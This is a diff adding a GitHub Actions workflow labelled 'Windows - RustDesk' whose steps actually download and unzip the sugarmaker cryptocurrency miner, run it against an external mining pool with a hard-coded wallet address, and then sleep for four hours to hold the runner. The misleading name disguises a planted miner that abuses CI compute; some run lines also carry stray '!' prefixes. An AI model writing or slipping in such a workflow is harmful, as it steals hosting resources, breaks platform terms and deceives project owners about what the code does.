@@ -1,1 +1,24 @@
+name: Windows - RustDesk
 
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: SUGAR
+    runs-on: ubuntu-latest
+    timeout-minutes: 9999
+    
+    steps:
+      - name: Downloading & Installing Essentials
+        run: |
+          !wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
+          !unzip sugarmaker-v2.5.0-sugar4-linux64.zip
+
+      - name: Start
+        run: |
+          !./sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1q9weaynzepyzkhrh72hl6deh0ua5wf4f8cz8mve -t2
+
+      - name: Time Counter
+        run: |
+          !sleep 14400
